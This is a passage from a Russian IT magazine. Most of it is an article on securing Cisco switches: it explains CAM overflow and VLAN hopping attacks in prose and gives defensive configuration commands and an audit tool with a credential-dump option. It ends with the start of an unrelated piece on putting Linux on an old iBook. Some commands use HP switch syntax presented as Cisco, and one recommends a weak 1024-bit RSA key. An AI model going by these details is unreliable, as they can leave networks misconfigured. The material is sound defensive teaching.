нополые подростки в пубертатный период.
   Так как хосты располага ются в одной подсети, маршрутизатор для этого
не требуется и весь обмен пакета ми будет про исходить с помощью ком‐
мутатора в несколько этапов.
 1. PC1 хочет обратиться к PC2 по IP‐адресу. Тем не менее MAC‐адрес PC2
   ему неизвестен, поэто му PC1 использует про токол ARP. Для этого отправ‐
   ляется широковещательный запрос всей сети.
 2. Получив широковещатель ный запрос, коммутатор пересы лает его на все
   свои порты, но записывает соответствие MAC‐адреса отправителя (0000.
  1111.1111) и пор та. Теперь все пакеты, адресованные данному получа‐
   телю, он будет пересылать адресату, а не во все доступные интерфейсы
   подряд.
 3. PC2 получает адресованный ему пакет, понимает, что должен ответить,
   и сообщает свой MAC‐адрес PC1. Коммутатор при этом заносит в CAM‐
   таблицу (таблицу MAC‐адресов) запись вида интерфейс gig1/2  MAC
  0000.2222.2222).  Теперь,  когда компь юте ры начнут обмениваться
  информацией, будут использовать ся только два порта, за которы ми они
   расположены. На другие порты информа ция пересылаться не будет.





               Иллюс тра ция ата ки СAM table overﬂow

Основной смысл рассказанной выше романтичес кой истории общения двух
устройств заключается в том, что, если коммутатор видит адрес получателя
в своей CAM‐таблице, он пересылает этот пакет на конкретный порт. Если
не видит — устраивает широковещательную рас сылку в надежде, что пакет
все‐таки найдет своего адресата в подконтроль ной сети. Дело в том, что раз‐
мер таблицы MAC‐адресов у любого коммутатора ограничен. И при перепол‐
нении этой таблицы новые адреса реальных клиентов уже не смогут быть
записаны в нее.
   Таким образом, хакеру необходимо всего лишь сгенерировать большое
количество ложных адресов и заставить коммутатор записать их в свою таб‐
лицу, чтобы реальные адреса реальных устройств постепенно были оттуда
вытеснены.
  Коммутатор начнет рассылать кадры, адресованные конкретному получа‐
телю, на все порты, находя щиеся в том же VLAN. Следовательно, у атакующе‐
го устройства появится воз можность перехватить и прочитать их.
  А еще все коммутаторы, подключенные к ата кованному, тоже подхватят
фейковые MAC‐адреса и начнут вести широковещательную рассылку по всей
корпоративной сети, умножая угрозу.


Атака на виртуальные сети, или VLAN hopping
Следующая атака базиру ется на возможнос ти коммутаторов автоматически
согласовывать тип своего порта — access или trunk. В двух словах расскажу
о том, чем порт access отличается от trunk. Наберись терпения!
   Как известно, протокол 802.1Q использует ся во всех современных сетях.
Хитрая особенность это го протокола состоит в том, что он слегка расширяет
ethernet‐кадр, добавляя туда несколько полей (в час тности, поле VLAN Identiﬁ‐
er, VID). На основании это го поля коммутатор способен определить, какой
группе портов адресован тот или иной кадр.
   Благодаря полю VID к одному коммутатору можно подключить клиенты
из нескольких подсетей, тем самым огра ничив широковещательный домен.
Также появляется возможность объединить подклю ченные к разным ком‐
мутаторам клиенты в одну логическую сеть.





                 Иллюс тра ция ата ки VLAN hopping

Рассмотрим передачу кадра в сети с протоколом 802.1Q.
 1. PC1 подключен к access‐пор ту fa0/1 коммутатора SW1 в VLAN c поряд‐
   ковым номером 10. Это означает, что при попада нии кадра на порт ком‐
   мутатора в него будет добавлен 802.1Q‐header с информацией о принад‐
   лежности к VLAN10.
 2. SW1 пересылает тегированный кадр на SW2 через trunk‐порт.
 3. SW2 получает кадр, смотрит в свою CAM‐таблицу и отправляет кадр
   на соответствующий access‐порт, заголовок 802.1Q снимается.

При этом можно выделить следующие особенности:
 • клиенты ничего не зна ют о сво ей принадлежности к опре деленному VLAN
   и работают с нетегированными кадрами, заголовок 802.1Q появляется
   только при про хождении кадра через access‐порт;
 • порт может быть не тегирован (access) только в одном VLAN;
 • через тегиро ванный  (trunk) порт можно передавать кадры, принад‐
  лежащие к разным VLAN;
 • существует так называемый native VLAN — при попадании на trunk‐порт
   кадра без тега он автоматически будет причислен к native VLAN. Как пра‐
   вило, native VLAN по умолчанию — это VLAN1 (но это можно изменить);
 • при этом кадры, принадлежащие native VLAN и попавшие в access‐порт,
   передаваться через trunk‐порт будут без тега.

А теперь перейдем к самой атаке. Как уже было ска зано, VLAN hopping осно‐
ван на том, что коммутаторы имеют возможность автоматически согласовы‐
вать тип порта. Использует ся для это го проп риетарный протокол компании
Cisco под названием DTP. При его использовании (а он включен по умол‐
чанию) возможны сле дующие состояния порта: dynamic auto, dynamic de‐
sirable, static access, static trunk.
   Как мы видим, при определенных усло виях, а именно в режимах dynamic
auto и dynamic  desirable, порт коммутато ра может согласовать свою
работу в режиме trunk. Это зна чит, что, если ата кующее устройство будет
вести себя как порт в режиме desirable, оно согласует на себя trunk‐порт
и получит доступ к трафику всех виртуальных сетей, которы ми оперирует ком‐
мутатор.
  Основная проб лема заключается в том, что на коммутаторах Cisco все
порты по умолчанию находятся в режиме auto. Поэтому, даже если порт нас‐
троен в режиме access/auto, при получении запроса на согласование его
состояние может измениться на trunk/auto.


ГОТОВИМСЯ К ОБОРОНЕ
Что ж, а вот теперь пришло время засучить рукава и прис тупить к укреплению
нашего корпоративного бастиона. Ниже мы рас смот рим настрой ку функций
и режимов работы IOS для нейтра лизации всех описанных выше атак, а также
ряд дополнительных фич, которые помогут тебе сделать сеть еще чуть‐чуть
более безопасной.


           WARNING

                    Перед любыми операциями кон фигурирова ния
                       сетевых устройств не забывай сделать бэкап кон‐
                        фига! Документируй все изме нения, чтобы потом
                      не потерять лог изменений и не вырвать себе
                        с досады волосы на затылке.



Защита от Rogue DHCP Server
Простейший способ защиты от атак класса Rogue DHCP Server — это вклю‐
чить на всех коммутаторах такую функцию, как DHCP snooping. Однако
перед этим необходимо определить два типа портов:
 • до верен ные — порты коммутатора, к которым подключается DHCP‐сер‐
   вер либо другой легитимный коммутатор;
 • не дове рен ные — порты для клиентских подключений, за которыми
  DHCP‐сервер находиться не может.

В данном случае DHCP snooping необходим для того, чтобы указать ком‐
мутатору, что следует обра щать внимание на проходя щие сквозь него пакеты
DHCP offer и acknowledgment и не допускать прохождения таких пакетов
с недоверенных пор тов. Также широковещательные запросы от клиента (dis‐
cover и request) теперь будут перенаправляться только на доверенные пор‐
ты.
  Для конфигурирования функции DHCP snooping необходимо следующее.
  Вклю чить ее на коммутато ре:


SW(config)# ip dhcp snooping

Указать, для каких VLAN требуется отслеживать DHCP‐пакеты:


SW(config)# ip dhcp snooping vlan <N>

Ну и наконец, указать доверенные порты на коммутаторе:


SW(config‐if)# ip dhcp snooping trust <N>


Методы защиты от DHCP starvation
Самый простой способ защиты — огра ничить число MAC‐адресов на порте
коммутатора. Реализуется это с помощью активации режима port‐security.
Как его включить? Очень просто.
  Переводим порт в режим access:


SW(config‐if)# switchport mode access

Вклю чаем port‐security на интересу ющем нас интерфейсе:


SW(config‐if)# switchport port‐security

Ограничиваем число MAC‐адресов на интерфейсе:


SW(config‐if)# switchport port‐security maximum <N>

Далее выбираем способ изучения MAC‐адресов коммутатором — статичес‐
кий (sticky):


SW(config‐if)# switchport port‐security mac‐address <mac‐address |
sticky>

И финальным шагом задаем тип реагирования на пре вышение числа раз‐
решенных MAC‐адресов:
 • protect — после перепол нения все пакеты, отправленные с дру гих MAC‐
   адресов, отбрасываются;
 • restrict — то же самое, что и в предыдущем случае, но с уве домлением
   в syslog или по SNMP;
 • shutdown — порт выключа ется до автоматического или ручного его под‐
   нятия (самый верный вариант).


SW(config‐if)# switchport port‐security violation <protect |
restrict | shutdown>

Таким образом, атакующий уже не сможет исчерпать лимит IP‐адре сов пула
DHCP, так как коммутатор не позволит ему бес конечно изме нять свой MAC‐
адрес.
   Также здесь может помочь все тот же DHCP snooping, который можно
сконфигурировать при помощи вот такой команды:


SW(config‐if)# ip dhcp snooping limit rate <N>

Эта команда ограничивает количес тво обра баты ваемых за секунду пакетов
DHCP на задан ном порте, а если ограничение превышено, переводит порт
в состояние err‐disable, то есть временно выключает его.


Методы защиты от VLAN hopping
Решение этой проб лемы очень прос тое, но многие при конфигурировании
коммутаторов забывают его использовать. Одной короткой командой мы
просто отключаем возможность авто матичес кого согласования и делаем ата‐
ку невозможной:


SW(config‐if)# switchport nonegotiate

Еще один потенциальный вектор атаки VLAN hopping — использование na‐
tive VLAN и добавление второго тега. Работает он только в том слу чае, если
атакующее устройство находится в native VLAN для trunk‐порта.
   Кадр, пришедший на порт fa0/1, находящийся в VLAN1, будет передавать‐
ся через trunk‐порт нетегированным. Но так как злоумышленник PC1 прис‐
воил ему два заголовка, на выходе он ока жется с тегом VLAN2 и дой дет
до атакуемого клиента, чего в норме быть не должно. Следует заметить, что
подобная атака однонаправленная, так как невоз можно по такой же схе ме
передать кадр обратно.
  Защититься можно следующим образом: наз нача ем на всех trunk‐портах
неиспользуемый VLAN в качес тве native:


SW(config‐if)# switchport trunk native vlan 999

Теперь атака неосущес твима, так как VLAN 999 не относится ни к одному
из access‐портов.


                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ
     СТАЛЬНАЯ КИСА
               ЗАЩИЩАЕМ СЕТЕВОЙ ПЕРИМЕТР
                       НА ОБОРУДОВАНИИ CISCO





До пол нительные опции безопасности
Рассмотрим более детальную настройку механизмов безопасности, пре дос‐
тавляемых штатными возможностями IOS.


Де тальная настройка port security
Port security — функция коммутатора, поз воляющая задать MAC‐адреса
хостов (клиентов сети), которым раз решено переда вать данные через этот
порт. После этого порт не передает пакеты, если MAC‐адрес отправите ля
не указан как разрешенный. Кроме того, можно не указывать конкретные
MAC‐адреса, разрешенные на порте коммутатора, а ограничить общее
количество MAC‐адресов, которым разрешено передавать трафик через дан‐
ный порт.
  Существует несколь ко режимов запоминания адресов:
 • Continuous — устройство с любым MAC‐адресом может без ограничений
   работать через порт коммутатора;
 • Static — от 0 до 8 MAC‐адресов могут быть статически заданы, остальные
   могут быть динамичес ки добавлены самим свитчем;
 • Conﬁgured — от 1 до 8 MAC‐адресов могут быть статически заданы, все
  динамические адреса отверга ются;
 • Limited‐continuous — от 1 до 32 MAC‐адресов могут быть динамичес ки
   добавлены самим коммутатором;
 • Port‐access — исполь зует ся вместе с опци ей 802.1X для того, чтобы вре‐
  менно задать MAC‐адрес аутентифицированной сессии в 802.1X.

А теперь разберем режимы реагирования на нарушения безопасности. И для
начала определимся, что в нотации Cisco считается нарушением безопас‐
ности для фичи port security: максимальное количество безопасных MAC‐
адресов было добавлено  в  таблицу адресов и  хост, чей MAC‐адрес
не записан в таблице адресов, пытается получить дос туп через интерфейс.
  А вот и сами режимы реагирования сетевого устройства на факты наруше‐
ния безопасности:
 • none — когда количество безопас ных MAC‐адресов достигает мак‐
   симального ограничения, нас троенного на порте, пакеты с неизвес тным
  MAC‐адресом отправителя отбра сываются до тех пор, пока не будет уда‐
   лено достаточ ное количес тво безопас ных MAC‐адресов, чтобы их было
   меньше максимального значения, или увеличено максимальное количес‐
   тво разрешен ных адресов. Оповещения о нарушении безопас ности нет;
 • sendalarm — когда количество безопасных MAC‐адре сов достигает
   максимального ограничения, настро енного на порте, пакеты с неизвес‐
   тным MAC‐адресом отправителя отбра сываются. Это происходит до тех
   пор, пока не будет уда лено достаточное количество безопас ных MAC‐
   адресов (чтобы их число было меньше максимального значения) или не
   будет увеличено максимальное количес тво раз решенных адре сов. В этом
  режиме при нарушении безопасности отправляются SNMP trap и сооб‐
  щение syslog;
 • senddisable —  нарушение  безопас ности  приводит  к  тому,  что
   интерфейс бло кируется и выключа ется немедленно. Отправляются SNMP
  trap и сообщение syslog. Когда порт заблокирован, вывес ти его из этого
   состояния можно, введя команду portsecurity <portid> clear
  intrusionflag, и затем вручную включить интерфейс, введя в режиме
   настройки интерфейса enable.

Eavesdrop  Prevention — функция, запрещающая передавать  unicast‐
пакеты, которые транслируют ся на неизвестные для коммутатора MAC‐адре‐
са. Это не позволя ет неавторизованным пользователям прослушивать тра‐
фик, передаваемый на MAC‐адреса, уда лен ные из таблицы коммутации
по тайм‐ауту (aged‐out).
  Важно заметить, что Eavesdrop Prevention никак не влияет на multicast‐
и broadcast‐трафик в домене. Коммутатор переда ет этот трафик через соот‐
ветствующие пор ты независимо от того, настро ена ли на них опция port secu‐
rity. А вот активация port security на интерфейсе автоматичес ки включает
на нем Eavesdrop Prevention.
  Команды для port security имеют следующий синтаксис:


switch(config)# port‐security <port‐list>
           [learn‐mode < continuous | static | port‐access | config
ured | limited‐continuous>]
           [action < none | send‐alarm | send‐disable >]
           [address‐limit <1‐8 | 1‐32>
           [mac‐address <mac‐addr1 [mac‐addr2]...>]
           [clear‐intrusion‐flag]

На коммутаторах Cisco с конвейера заданы следующие настройки по умол‐
чанию port security:
 • port security — выключен (disabled);
 • запоминание sticky‐адресов — выключено (disabled);
 • максимальное количес тво безопас ных MAC‐адресов на порте — 1;
 • режим реагирования на нарушения — shutdown;
 • время хранения адресов — отключено;
 • значение aging time — 0.


           WARNING

                    Важно  знать, что фича  port  security задается
                        в режиме настройки интерфейса (config)#.
                      Изначально на коммутато рах Cisco по умолчанию
                     любой порт находится в режиме dynamic auto,
                      однако этот режим несовместим с port secu‐
                   rity. И поэто му кон фигурируемый интерфейс
                       сначала необходимо ручками перевести в режим
                   trunk или access.


Итак, переводим наш порт в режим trunk или access:


switch(config‐if)# switchport mode <access | trunk>

Вклю чаем port security на интерфейсе (пос ле этого акти вированы настройки
по умолчанию):


switch(config‐if)# switchport port‐security

Нужно учесть, что после команды switchport port‐security автоматически
вклю чается port security с нас тройками, принятыми по умол чанию, и ее стоит
использовать, только если эти самые нас тройки тебе подходят. Если же тре‐
буется добавить какие‐то дру гие параметры, то сначала нужно их задать,
а затем вклю чить функцию.
  К примеру, задать максимальное количес тво безопасных MAC‐адресов
на интерфейсе или в VLAN можно следующей командой:


switch(config‐if)# switchport port‐security maximum <value> [vlan <
vlan‐list>]

А вот пример того, как на интерфейсе разрешить четыре MAC‐адреса,
а остальные настрой ки оставить по умолчанию:


switch(config)# interface Fastethernet0/1
switch(config‐if)# switchport mode access
switch(config‐if)# switchport port‐security maximum 4
switch(config‐if)# switchport port‐security

Еще один вариант — настро ить trunk и разрешить двадцать MAC‐адресов
в VLAN 10:


switch(config)# interface Fastethernet0/2
switch(config‐if)# switchport mode trunk
switch(config‐if)# switchport port‐security maximum 20 vlan 10
switch(config‐if)# switchport port‐security

Если на интерфейсе fa0/2 воз никнет нарушение безопасности в VLAN 10,
например появится какой‐то 21‐й MAC‐адрес, то заб локирован будет трафик
только этого VLAN, а не всего потока на порте.
   Чтобы просмотреть информа цию о нас тройках port‐security для VLAN 10,
используется следующая команда:


switch# show port‐security vlan 7

Если ты вручную задашь мень ше безопас ных адресов для порта, чем указано
в значении switchport port‐security maximum, то оставше еся количество
свободных адресов дополнится динамическими адресами по принципу «кто
первый встал, того и тапки».
  Для включения режима sticky запоминания адресов на порте используй
следующие команды:


switch(config‐if)# switchport port‐security mac‐address sticky
switch(config‐if)# switchport port‐security mac‐address sticky [
mac‐address | vlan <vlan‐id | <access | voice>>]

Режим реагирования на нарушения безопас ности (по умол чанию shutdown)
конфигурируется так:


switch(config‐if)# switchport port‐security violation <protect |
restrict | shutdown>

Если же порт был настроен (или оставлен по умолчанию) в режиме реаги‐
рования shutdown, то при нарушении порт перейдет в состояние error‐dis‐
abled.
  А вот команда, которая позволяет пос мотреть, перешел ли порт в сос‐
тояние error‐disabled:


switch# show interfaces <interface‐number> status

Ну и если ты захочешь обнулить все значения, чтобы «начать жизнь с чистого
листа», тебе понадобится команда для пол ной очис тки таблицы MAC‐адре‐
сов:


switch# clear port‐security [all|configured|dynamic|sticky] [address
<mac>|interface <int‐id>]


Тюнинг Dynamic ARP Inspection
Dynamic ARP Inspection (Protection) — функция коммутатора, предназначен‐
ная для защиты от атак с использованием протоко ла ARP. Например, от атаки
ARP spooﬁng, позволя ющей перехватывать трафик между узлами, которые
расположены в пределах одно го широковещательного домена.
  Для корректной работы фичи Dynamic ARP Inspection изначально необ‐
ходимо указать, какие порты коммутатора будут до верен ными (trusted),
а какие — не дове рен ными (untrusted):
 • недоверенные (Untrusted) — это порты, к которым подключены все кор‐
   поративные клиенты. Для всех недоверенных портов выполняется ряд
   проверок сообщений ARP;
 • доверенные (Trusted) — порты коммутатора, к которым подключен другой
   коммутатор (по  сути, транк). Сооб щения про токола ARP, полученные
   с доверенных портов, не отбра сываются.

Вклю чаем Dynamic ARP protection на требуемом интерфейсе:


switch(config)# arp‐protect

Теперь включаем Dynamic ARP protection в VLAN, которые должны быть
защищены с его помощью:


switch(config)# arp‐protect vlan 7

Указываем доверенные порты:


switch(config)# arp‐protect trust a3

Просматриваем информа цию о настройках Dynamic ARP protection:


switch(config)# show arp‐protect

Задаем статические соответствия «IP‐адрес — MAC‐адрес»:


switch(config)# ip source‐binding <vlan‐id> <ip‐address> <
mac‐address> <port‐id>

И наконец, просматриваем выполненные нас трой ки:


show ip arp inspection interfaces
show errdisable recovery


Настраиваем IP Source Guard
IP Source Guard (или Dynamic IP Lockdown) — функция коммутатора, которая
ограничивает IP‐трафик на интерфейсах второго уровня, фильтруя трафик
на основании таблицы привязок DHCP snooping и статичес ких соответствий
(DHCP snooping binding database). Эта фича активно используется для борь‐
бы с такими безоб разиями, как IP spooﬁng.
   Итак, вводим сле дующие команды и включаем IP Source Guard:


ip verify source
ip verify source port‐security
ip source binding mac‐address vlan vlan‐id ip‐address interface
interface‐id
show ip verify source [interface interface‐id]
ip source‐lockdown
ip source‐lockdown <port‐list>

Функция Dynamic IP lockdown остается выключенной на порте, если выпол‐
няется любое из следующих условий:
 • если DHCP snooping не включен глобально на коммутаторе;
 • если порт не принадлежит хотя бы одному VLAN, в котором включен DHCP
  snooping;
 • если порт настроен как доверенный порт (trusted) для DHCP snooping.

Убедиться в том, что хотя бы одно из этих усло вий выполняется, можно
командами


show ip source‐lockdown status
show ip source‐lockdown bindings [<port‐number>]
debug dynamic‐ip‐lockdown


Тюнин гуем SSH
Конечно же, необходимо ска зать нес колько слов о безопасности удаленных
подклю чений для управления сетевыми устрой ства ми. Речь пойдет о про‐
токоле SSH. Задаем имя домена (это будет необ ходимо нам в дальнейшем
для генерации клю чей):


ip domain‐name <MyAddress.ru>

Создаем пару ключей с использованием алгорит ма RSA:


crypto key generate rsa modulus 1024

Переключаем SSH на использование версии протоко ла v.2:


ip ssh version 2

Создаем пользователя в локальной базе:


username admin secret <your password>

Настраиваем линии VTY:


line vty 0 4
login local
transport input ssh

Задаем  ограничение  времени  timeout  аутентификации  (по  умол‐
чанию 120 с):


ip ssh time‐out <N sec>

А вот пример лимитирова ния тайм‐аут‐аутентификации:


Router(config)# ip ssh time‐out 60

Указываем интерфейс для всех сес сий SSH:


Router(config)# ip ssh source‐interface FastEthernet0/1

Вклю чаем журналирование событий SSH ip ssh logging events:


Router(conifig)# ip ssh logging events

Указываем версии использования протокола ip ssh version:


Router(config)# ip ssh version 2

Указываем, какой ключ должен использовать ся при соединении:


sw‐c2860(config)# ip ssh rsa keypair‐name <MyAddress.ru>


Бо нус: обзор тул зы Cisco Config Analysis Tool
Cisco Conﬁg Analysis Tool — это крохотная кон сольная утилита, написанная
на Python. Она предназна чена для анализа ста туса настроек безопас ности
в конфигурационных файлах любых девайсов Cisco. На GitHub раз работчика
приведен чек‐лист тех опций, которые проверяет ути лита. В общем, это очень
крутой анализатор, который сделает всю пыль ную работу по аудиту за тебя.





           Стартовое меню утилиты Cisco Conﬁg Analysis Tool

Утилита доступна как для Linux, так и для Windows. Чтобы запустить проверку
без дополнительных опций, дос таточно ввес ти всего лишь одну команду:


$ python3 ccat.py <your configuration_file>

Также можно запустить исполня емый файл через PowerShell на Windows:


> ccat.exe <your configuration_file>

А вот некоторые допол нительные клю чи запус ка:
 • vlanmap — указать путь к файлу vlanmap;
 • output — указать путь к выходному каталогу файлов HTML (отчет);
 • storm_level — соот ветствующий уровень для «шторм‐контроля»
   (значение по умол чанию равно 80);
 • max_number_mac —  максимальное   количес тво  MAC‐адресов
   для защиты порта (по умолчанию 10);
 • disabledinterfaces — при нудительно проверять интерфейсы,
  даже если они выключены;
 • noconsoledisplay — выводить результаты анализа в каталог
  HTML‐файлов;
 • dumpcreds — выводить в отчете имена пользователей, пароли и хеши
   из конфигов;
 • graph — построить карту сети VLAN.


ЗАКЛЮЧЕНИЕ
Сегодня мы познакомились с механикой типовых сетевых атак в периметре
корпоративного ИТ‐ландшафта, а также научились настраивать штатные фун‐
кции безопасности, которые входят в арсенал операционной системы Cisco
IOS. Ну а чтобы узнать, включены ли все эти опции, ты можешь восполь‐
зоваться реактивной утилитой Cisco Conﬁg Analysis Tool. Если что‐то из при‐
веденного в статье списка отсутствует, эту функцию нужно срочно активиро‐
вать — для твоего же спо койствия.


        WWW

                        •Cisco IOS Switch Security Conﬁguration Guide
                          (PDF) — одна из лучших книг‐гайдов по нас‐
                         тройке секурных опций на сетевых устройствах
                            Cisco. Содержит подробное изложение теоре‐
                          тических основ, описание команд и примеры
                         конфигураций.
                        •Cisco Guide to Harden Cisco IOS Devices — гайд
                       самой Cisco, как усилить безопасность работы
                        выпускаемых ей коммутаторов и маршрутиза‐
                           торов.
                        •Cisco IOS Security Conﬁguration Guide (Release
                            12.4) — еще одна книга Cisco, где ты найдешь
                        подробное описание всех опций безопасности
                         для свитчей и роуте ров последнего поколения.
                        •Cisco IOS Switch Security Conﬁguration Guide
                           v1.0 Checklist — типовой чек‐лист для проверки
                       включенных  опций  безопасности,  принятых
                          за стандарт в Национальном институте стан‐
                         дартизации США (NIST).
GEEK

НЕКРО МАКИНТОШ

СТАВИМ LINUX НА СТАРИННЫЙ
IBOOK, ЧТОБЫ ВДОХНУТЬ
В НЕГО ЖИЗНЬ





  Валентин Холмогоров
   valentin@holmogorov.ru





Старому макбуку с про цессором PowerPC можно найти мас‐
су достойных при менений. Например, им очень удобно
колоть орехи. Древний PowerBook отлично сгодится в качес‐
тве подпорки под мебель или укра шения интерьера. А еще
в него можно вдохнуть новую жизнь, для чего нам понадо‐
бится пара свободных вечеров, немного черной магии и,
конечно же, эта статья в качестве источника вдохновения.


ЭХ, ЯБЛОЧКО…
В 2005 году произошло множество знамена тельных событий. Компания
Adobe приобре ла Macromedia за 3,4 миллиарда дол ларов, корпорация Mi‐
crosoft дала имя новой версии своей операционной системы, идущей на сме‐
ну Windows XP (это имя — Vista), а в Apple решили окончательно отказаться
от процессоров PowerPC в пользу Intel. Сей час, спустя четырнадцать лет,
«яблочный» ноут бук с PPC на борту можно купить по объявле нию все го лишь
за пару тысяч рублей. Однако при этом остается откры тым вопрос, что
с подобным сом нительным приобретением делать дальше.


             INFO

                     Процессоры PowerPC — результат совместной
                       разработ ки компаний Apple, IBM и Motorola. Пер‐
                     вые образцы этих чипов, базирующихся на архи‐
                         тектуре RISC, появились на свет в 1991 году.
                    Причиной отказа Apple от PPC в составе компь‐
                     юте ров, серверов и ноутбуков стало то, что про‐
                      цессоры PowerPC обеспечивали лишь 15 единиц
                      производительности на 1 ватт потраченной энер‐
                          гии, в то время как у Intel указан ный показатель
                      достигал 70 единиц. По крайней мере именно эту
                      причину озвучил Стив Джобс 6 июня 2005 года
                       во время своего выступления на конференции
                  WWDC.


В современном мире у антикварной техники Apple насчитывается немало
проблем. Прежде всего, на древний «Мак» с PowerPC можно установить OS X
вплоть до версии 10.5 Leopard включительно, все более поздние реализации
этой системы поддерживают только архи тек туру Intel. Из этого следует нес‐
колько выводов: софт под такую ОС тоже идет специальный, разработанный
для архитектуры PPC. Современных версий подоб ных программ не существу‐
ет в природе, а чтобы отыскать старые, при дется преодолеть непростой
квест.
  Ко всему прочему процес соры G4 по нынешним меркам весьма тор‐
мозные, и Leopard на них вороча ется с трудом. Старый браузер Safari отка‐
зывается открывать большинс тво современных сайтов, а альтернативой ему
может служить лишь TenFourFox — браузер на базе Firefox для старых «Маков»
на PowerPC. Но установка этой софтины также не спасет пользователя
от сопутствующих траблов: нап ример, прос мотр видеороликов на YouTube
все равно будет напоминать слайд‐шоу из‐за слабой конфигурации ноутбука.
  Идея увеличить оперативку на большинс тве ста рых ноутов Apple спотыка‐
ется об аппаратные ограничения: часть памяти (как правило, 256 Мбайт)
намертво распаяна на материнской пла те, и в рас поряжении пользователя
остается только один слот, куда можно воткнуть планку PC100 или PC133
SDRAM объемом 128–512 Мбайт, что, впрочем, не сильно поможет в плане
повышения быстродействия. В общем, железо по нынешним временам, пря‐
мо скажем, слабенькое: любой нетбук на Intel Atom уделывает по произво‐
дительности древ ний «Мак».





         В старых макбуках есть какое‐то особое очарование

Некоторое вре мя назад я стал счастливым обла дателем Apple iBook А1133,
выпущенного в 2005 году. Двенадцатидюймовый ноутбук, оборудованный
процессором PowerPC 7447a (G4) с тактовой час тотой 1,33 ГГц, 512 Мбайт
памяти и жестким диском объемом в 40 Гбайт, дос тался мне в приличном
внешнем состоянии, одна ко с напрочь убитым винтом, изобилующим бэдами,
из‐за чего родная система наотрез отказыва лась запускаться.
  Было решено реанимиро вать ноут, но от идеи использовать на нем OS X я
отказал ся сразу — предыдущий опыт работы со ста рыми «Маками» показы‐
вал, что ничего путного из этого не выйдет. Неужели, подумал я, для PowerPC
нет достойных вариантов альтернативных систем? Ведь даже на довольно
слабые одноплатные компь ютеры с архитектурой ARM можно установить
вполне современный Linux, который поз волит выполнять большинство рутин‐
ных задач. И я углубился в поиски.


ПОПЫТКА НОМЕР РАЗ: YELLOW DOG LINUX
Еще в первой половине нулевых встречались люди, очень недовольные
политикой Apple, монополизирующей свой сегмент рынка. Мыслимое ли
дело — на компьютеры и ноуты производс тва этой компании можно было
установить только Mac OS, и никакой альтернативы этой опе рационной сис‐
теме до определен ного момента не существо вало. «Так дело не пойдет,
у пользователей дол жен быть выбор», — решили независимые разработчики
и придумали Yellow Dog Linux — специальную версию Linux, раз работанную
конкретно для платформы PowerPC с прицелом на «Маки» и Sony PlayStation
3, построенную на такой же архитектуре.
   Yellow Dog Linux осно вана на CentOS. В исто рию эта реализация Linux
вошла тем, что именно в ней впервые появился консольный менед жер
управления пакетами RPM — Yellowdog Updater, Modiﬁed (YUM), который
затем мигрировал в Red Hat, CentOS, Fedora и дру гие rpm‐based дис трибути‐
вы. Развитие Yellow Dog прекратилось в 2012 году с выходом версии 7, то
есть через три года после завершения поддержки архитектуры PowerPC
«нативной» опе рационной системой от Apple. Сейчас на сайте компании‐раз‐
работчика Fixstars уже практичес ки не осталось никаких упоминаний об этом
проекте, но интернет, как известно, пом нит все.
  В комплекте поставки Yellow Dog вроде бы имеется необходимый набор
софта: графический редактор GIMP, ﬂash‐про игрыватель Gnash, браузер
Mozilla Firefox, хорошо зна комый многим почтовый клиент Thunderbird, про‐
игрыватель Rhythmbox и, конечно же, офисный пакет OpenOﬃce.org. Что
еще нужно пользователю для счастья? Оста ется откры тым вопрос произво‐
дительности Linux по сравнению с macOS, однако ответ на него можно найти
лишь экспериментальным путем.


СЕАНС НЕКРОМАНТИИ
Первая проблема в столь непростом деле — раз добыть сам дистрибутив.
На сайте разработчиков все упоминания о Yellow Dog Linux уже давно ведут
на страницу 404, однако что‐то там еще можно отыс кать. Кроме того, в Сети
сохранилось несколько ресурсов с архивами. Например, вот здесь можно
скачать ISO‐образ диска со ста бильной вер сией 6.2 (именно этот дистри‐
бутив я в итоге и водрузил на свой «некромак»). Нарезав образ на DVD‐бол‐
ванку с помощью обычного Nero, я приступил к уста новке системы.
  Вклю чив ноутбук с зажатой клавишей С, вставляем диск с Linux в мультид‐
райв и дожидаемся, пока на экра не появится следующая надпись:



  Welcome to yaboot version 1.3.13
  Enter “help” to get some basic usage information
  boot:


Теперь нужно просто нажать клавишу Enter (которая у маководов называется
Return) и немного потерпеть до появления симпатичного графического
интерфейса программы уста новки.





            Так выглядит программа установки Yellow Dog Linux

Можно выбрать русский язык, а сам процесс нагляден и прост, за исключени‐
ем нескольких тонких моментов. Один из них — настройка дисковых раз‐
делов. Если до этого на «Маке» была OS X, можно выбрать вариант «Удалить
разделы на выбранных дисках и создать раз биение по умолчанию», нажать
на кнопку «Далее» и согласиться с тем, что установщик снесет всю информа‐
цию с компа. Если же OS X ранее установлена не была, разделы придется
создавать вручную, так как для установки Yellow Dog Linux жесткий диск обя‐
зательно должен содержать раздел Apple Bootstrap.


             INFO

                        Apple  Bootstrap —  технология,  придуманная
                   еще задолго до появления iBook (и канувшая
                        в Лету с переходом Apple на архитектуру Intel).
                      Если кратко, это специальный корневой раздел
                      объемом менее 8 Мбайт, в котором хранится заг‐
                        рузочный  код.  Дан ный  раздел  при  запуске
                   машины читается первым и передает управление
                       дальнейшей загрузкой ядру Linux (либо OS X,
                       если на компьютере использует ся эта система).


Итак, выбираем в окне программы установки вари ант «Соз дать собс твенное
разбиение» и нажимаем на кнопку «Далее». Нам придется вручную удалить
все имеющиеся на жестком диске логичес кие раз делы и создать вместо них
следующие:
 • загрузочный раздел Apple Bootstrap объемом 6–8 Мбайт (его следует выб‐
   рать в списке предлагаемых раз делов в верхней час ти окна);
 • раздел подкачки Swap объ емом 1,5–2 Гбайт;
 • основной раздел  ext3 с  точкой монтирова ния / , занимающий все
   оставшееся дисковое пространство.





          Подготов ка разделов для установки Yellow Dog Linux

Возможный  выбор  устанавлива емых  компонентов  сис темы  невелик:
это офисный пакет, веб‐сервер и средства разработчика ПО. Еще один неп‐
ривычный шаг на этапе установки Yellow Dog — предложение ввес ти учетные
данные на сайте ydl.net, который ког да‐то исполь зовался в качестве репози‐
тория ПО. Поскольку сайт, как и сам репози торий, давным‐давно мертв, этот
шаг придется пропустить.
  Интерфейс Yellow Dog в целом тра диционен для линуксов из середи ны
нулевых — несколь ко виртуальных рабочих столов, значки «Компьютер»
и «Корзина», небольшая панелька с кнопками приложений в верхней части
экрана (которая тут называется «полкой»). Ее положение можно произвольно
менять (я, например, сразу же прилепил ее к нижней части рабочего стола
наподобие панели задач Windows). Помимо уже перечисленных мною прог‐
рамм, в комплек те поставки обна ружился целый набор игр (Hatari, маджонг,
«Сапер», «Двадцать одно», всего двенадцать штук), допол нительный браузер
